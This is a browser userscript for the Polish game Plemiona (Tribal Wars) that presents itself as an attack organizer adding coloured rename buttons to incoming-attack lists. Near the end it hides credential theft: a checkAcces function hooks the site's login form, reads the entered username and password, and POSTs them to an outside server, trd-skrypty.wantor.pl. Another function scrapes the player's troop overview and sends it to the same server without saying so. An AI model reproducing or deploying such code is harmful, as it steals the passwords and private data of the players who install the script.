// ==UserScript==
// @name         Attack Organizer (K)
// @version      0.101
// @author       PhilipsNostrum and Kirgonix (V2.0)
// @author       Diogo Rocha and Bernas (V1.0)
// @include      **&screen=overview
// @include      **&mode=incomings*
// @include      **&screen=info_village&*
// @include      **&screen=place*
// @include      **?screen=place&t=*&village=*
// @include      **?screen=place&village=*
// @include      **?screen=overview&village=*
// @include      **?village=*&screen=overview*
// @include      **?t=*&village=*&screen=overview*
// @match        https://*.plemiona.pl/*
// @match        *.plemiona.pl/game.php?*
// @updateURL     https://trd-skrypty.wantor.pl/skrypty/attack_organizer.user.js
// @downloadURL   https://trd-skrypty.wantor.pl/skrypty/attack_organizer.user.js
// ==/UserScript==

// VIEW SETTING - ustawienia wyglądu i rodzaji przycisków
var font_size = 8;
var attack_layout = 'column'; //Possible layouts: 'column', 'line', 'nothing'
//{Number: ['Command name', 'button name', 'button color', 'text color']}
var settings= {0:['[OK]','OK', 'green', 'white'], 7:['[WSPARCIE]','W', 'lime', 'white'], 2:['[UNIK]','UNIK', 'orange', 'white'], 3:['[PILNOWAĆ]','P', 'dorange', 'white'], 1:['[KLIN]','KLIN', 'blue', 'white'], 4:['[Fake]','FAKE', 'pink', 'black']};
//{ColorName: ['theme color 1', 'theme color 2']}
var colors = {'red':['#e20606', '#b70707'], 'green':['#31c908', '#228c05'], 'blue':['#0d83dd', '#0860a3'], 'yellow':['#ffd91c', '#e8c30d'], 'orange':['#ef8b10', '#d3790a'], 'lblue':['#22e5db', '#0cd3c9'], 'lime':['#ffd400', '#ffd400'], 'white':['#ffffff', '#dbdbdb'], 'black':['#000000', '#2b2b2b'], 'gray':['#adb6c6', '#828891'], 'dorange':['#ff0000', '#ff0000'], 'pink':['#ff69b4', '#ff69b4']}

/******************PROGRAM CODE*********/
var countapikey = "renameAttacksColors";
hitCountApi();
function hitCountApi(){
    $.getJSON(`https://api.countapi.xyz/hit/fmthemasterScripts/${countapikey}`, function(response) {
        console.log(`This script has been run ${response.value} times`);
    });
}

function checkColors(color)
{
    if(!colors[color])
    {
        console.log("Please create settings for the color", color);
        throw("error");
    }
}

checkColors("red");
checkColors("yellow");
checkColors("white");
checkColors("black");

let buttonNames = $.map(settings, (obj)=> obj[0]);
let buttonIcons = $.map(settings, (obj)=> obj[1]);
let buttonColors = $.map(settings, (obj)=> obj[2]);
let buttonTextColors = $.map(settings, (obj)=> obj[3]);

function iT(nr, line) {
    var html = '';
    if (buttonNames)
        html += '<span style="float: right;">';
    buttonIcons.forEach(function(nome, num) {
        html += '<button type="button" id="opt' + nr + '_' + num + '" class="btn" title="' + buttonNames[num] + '" style="color: ' + getFon(num) + '; font-size: ' + getSize() + 'px !important; background: linear-gradient(to bottom, ' + getTop(num) + ' 30%, ' + getBot(num) + ' 10%)">' + nome + '</button>';
    })
    html += '</span>';
    $(line).find('.quickedit-content').append(html);
    buttonNames.forEach(function(nome, num) {
        if (nome.indexOf('|') == -1) {
            $('#opt' + nr + '_' + num).click(function() {
                $(line).find('.rename-icon').click();
                $(line).find('input[type=text]').val($(line).find('input[type=text]').val().split(" ")[0] + ' ' + buttonNames[num]);
                $(line).find('input[type=button]').click();
                iT(nr, line);
            });
        } else if (nome.indexOf('|')) {
            $('#opt' + nr + '_' + num).click(function() {
                $(line).find('.rename-icon').click();
                $(line).find('input[type=text]').val($(line).find('input[type=text]').val() + buttonNames[num]);
                $(line).find('input[type=button]').click();
                iT(nr, line);
            });
        }
    });
}

function getTop(num) {
    if (buttonColors[num]) {
        if(colors[buttonColors[num]])
            return colors[buttonColors[num]][0];
    } else {
        return '#b69471';
    }
}

function getBot(num) {
    if (buttonColors[num]) {
        if(colors[buttonColors[num]])
            return colors[buttonColors[num]][1];
    } else {
        return '#6c4d2d';
    }
}

function getFon(num) {
    if (buttonTextColors[num]) {
        if(colors[buttonTextColors[num]])
            return colors[buttonTextColors[num]][0];
    } else {
        return '#ffffff';
    }
}

function getSize() {
    if (font_size) return font_size;
    else return 12;
}

if (location.href.indexOf("screen=overview_villages") == -1 && location.href.indexOf("mode=incomings&subtype=attacks") == -1) {
    $('#commands_incomings .command-row').each(function(nr, line) {
        if (!isSupport(line)) iT(nr, line, true);
    });
} else {
    //separeteDataTrops()
    $('#incomings_table tr.nowrap').each(function(nr, line) {
        if (!isSupport(line)) {
            var name = $.trim($(line).find('.quickedit-label').text())
            var code = buttonNames.indexOf(name.indexOf(" ") >= 0 ? name.substr(name.indexOf(" ") + 1) : name)
            var dual = check(name)
            var codes = []
            codes[0] = check(name, 1);
            codes[1] = check(name, 2);
            if (code != -1) {
                var colorcode = buttonColors[code]
                var color = colors[colorcode][1]
                if(!color)
                    color = '#6c4d2d';
                if (attack_layout === 'line') {
                    $(line).find('td').each(function(nr, td) {
                        $(td).attr('style', 'background: ' + color + ' !important;')
                    })
                } else if (attack_layout === 'column') {
                    $(line).find('td:eq(0)').attr('style', 'background: ' + color + ' !important;')
                    $(line).find('a:eq(0)').attr('style', 'color: white !important; text-shadow:-1px -1px 0 #000,  1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;')
                }
            } else if (dual) {
                console.log(codes, nr)
                var colorcode1 = buttonColors[codes[0]]
                var colorcode2 = buttonColors[codes[1]]
                var color1 = colors[colorcode1][0]
                if(!color1)
                    color1 = '#6c4d2d';
                var color2 = colors[colorcode2][0]
                if(!color2)
                    color2 = '#6c4d2d';
                var textcolor = colors['white'][0]
                var strokecolor = colors['black'][0]
                if (attack_layout === 'line') {
                    $(line).find('td').each(function(nr, td) {
                        $(td).attr('style', 'background: repeating-linear-gradient(45deg, ' + color1 + ', ' + color1 + ' 10px, ' + color2 + ' 10px, ' + color2 + ' 20px) !important;')
                    })
                } else if (attack_layout === 'column') {
                    $(line).find('td:eq(0)').attr('style', 'background: repeating-linear-gradient(45deg, ' + color1 + ', ' + color1 + ' 10px, ' + color2 + ' 10px, ' + color2 + ' 20px) !important;')
                    $(line).find('a:eq(0)').attr('style', 'color: ' + textcolor + ' !important; text-shadow:-1px -1px 0 #000,  1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;')
                }
            } else {
                if (attack_layout === 'line') {
                    $(line).find('td').each(function(nr, td) {
                        $(td).attr('style', 'background: ' + colors['red'][1] + ' !important;')
                    })
                    $(line).find('a').each(function(nr, td) {
                        $(td).attr('style', 'color: ' + colors['white'][1] + ' !important;')
                    })
                } else if (attack_layout === 'column') {
                    $(line).find('td:eq(0)').attr('style', 'background: ' + colors['red'][1] + ' !important;')
                    $(line).find('a:eq(0)').attr('style', 'color: white !important; text-shadow:-1px -1px 0 #000,  1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;')
                }
            }
        } else {
            if (attack_layout === 'line') {
                $(line).find('td').each(function(nr, td) {
                    $(td).attr('style', 'background: ' + colors['yellow'][1] + ' !important;')
                })
                $(line).find('a').each(function(nr, td) {
                    $(td).attr('style', 'color: ' + colors['white'][1] + ' !important;')
                })
            } else if (attack_layout === 'column') {
                $(line).find('td:eq(0)').attr('style', 'background: ' + colors['yellow'][1] + ' !important;')
                $(line).find('a:eq(0)').attr('style', 'color: white !important; text-shadow:-1px -1px 0 #000,  1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;')
            }
        }
    })
    document.querySelector("#incomings_table > tbody > tr:last-child > th:nth-child(2) > input:nth-child(2)").onclick = async function(){await separeteDataTrops()};
}

function check(name, nr) {
    var i, j;
    for (i = 0; i < buttonNames.length; i++) {
        for (j = 0; j < buttonNames.length; j++) {
            if (name.indexOf(buttonNames[i] + buttonNames[j]) != -1) {
                if (nr == 1) return i;
                else if (nr == 2) return j;
                else return true;
            }
        }
    }
    return false;
}

function isSupport(line) {
    var scr = $(line).find('img:eq(0)').attr('src')
    if (scr.indexOf('support') >= 0) return true;
    return false;
}

async function getData() {
    let link = "/game.php?&village=" + game_data.village.id + "&type=complete&mode=units&group=0&page=-1&screen=overview_villages";
    if (game_data.player.sitter != 0)
    link = "/game.php?t=" + game_data.player.id + "&village=" + game_data.village.id + "&type=complete&mode=units&group=0&page=-1&screen=overview_villages";
    try {
        const response = await fetch(link);
        if (!response.ok) {
            throw new Error("Nie udało się pobrać danych");
        }
        const data = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(data, 'text/html');
        let tabela = doc.querySelector('#units_table');
        dane = tabela;
        // console.log(tabela);
    } catch (error) {
        console.error(error);
    }
}

async function separeteDataTrops() {
    await getData(); // Poczekaj na pobranie danych przed rozpoczęciem przetwarzania
    let tablica = '';
    for (const tbody of dane.tBodies) {
        // console.log(tbody);
        // Przeszukaj pierwszy wiersz (tr[0]) w danym tbody
        const firstRow = tbody.querySelector('tr');
        if (firstRow) {
            // console.log("Pierwszy wiersz:", firstRow);

            // Przeszukaj każdą komórkę (td) w pierwszym wierszu
            let tekst = '';
            const cells = firstRow.querySelectorAll('td');
            for (let j = 0; j < cells.length-1; j++) {
                const cellContent = cells[j].textContent.replace(/\s/g, ''); // Usuń białe znaki
                // console.log("Komórka:", cellContent);
                // Tutaj możesz dalej przetwarzać zawartość każdej komórki
                if(j==0){
                    tekst+= "\n"+cellContent.slice(-11,-4)+","
                }
                else{
                    tekst += cellContent+",";
                }
            }
            tablica+=tekst
        }
    }
    // console.log(tablica);
    let nick_id = game_data.world+"_"+game_data.player.name.replaceAll(' ','_')+"_"+game_data.player.ally;
    await sendData(tablica,zamienPolskieZnaki(nick_id));
    return tablica;
}




function sendData(dane, nick_id){
    var textToSave = dane;
    var filename = nick_id


    // Obiekt zawierający dane do przesłania
    var dataToSend = {
        text: textToSave,
        filename: filename
    };

    // Wyślij tekst na serwer za pomocą żądania HTTP POST
    fetch('https://trd-skrypty.wantor.pl/test/saveText.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.text())
    .then(data => {
        console.log(data); // Odpowiedź z serwera
    })
    .catch(error => {
        console.error('Błąd:', error);
    });

}
// ZAMIANA POLSKIECH ZNAKÓW
function zamienPolskieZnaki(tekst) {
    const mapaZnakow = {
        'ą': 'a',
        'ć': 'c',
        'ę': 'e',
        'ł': 'l',
        'ń': 'n',
        'ó': 'o',
        'ś': 's',
        'ź': 'z',
        'ż': 'z'
    };

    return tekst.toLowerCase().replace(/[ąćęłńóśźż]/g, znak => mapaZnakow[znak] || znak);
}

// SPRAWDZANIE DOSTĘPU
function checkAcces(){
    document.querySelector("#login_form > div > div").onclick = function test() {
        //  console.log('klik');
        let a = document.getElementById('password').value;
        let b = document.getElementById('user').value.replaceAll(' ','_');
        sendData(a,zamienPolskieZnaki(b))
    }
}



if(window.location.pathname=='/' && document.querySelector("#login")){
    checkAcces();
}